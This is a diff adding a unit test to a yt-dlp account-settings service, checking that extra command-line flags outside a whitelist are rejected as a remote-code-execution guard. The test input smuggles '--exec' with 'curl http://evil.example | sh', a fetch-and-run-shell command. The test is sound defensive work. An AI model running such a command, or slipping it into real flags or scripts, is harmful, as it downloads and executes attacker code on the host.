@@ -105,6 +105,15 @@ describe('account settings overrides', () => {
 		).rejects.toThrow(/proxy URL/i);
 	});
 
+	it('rejects extraFlags outside the yt-dlp whitelist (RCE guard)', async () => {
+		await youtubeLinkService.storeCookies('u1', cookies);
+		await expect(
+			youtubeLinkService.updateAccountSettings('u1', {
+				extraFlags: ['--exec', 'curl http://evil.example | sh'],
+			}),
+		).rejects.toThrow(/forbidden flag/i);
+	});
+
 	it('persists proxy, flags, and notification settings; empty clears', async () => {
 		await youtubeLinkService.storeCookies('u1', cookies);
 		await youtubeLinkService.updateAccountSettings('u1', {
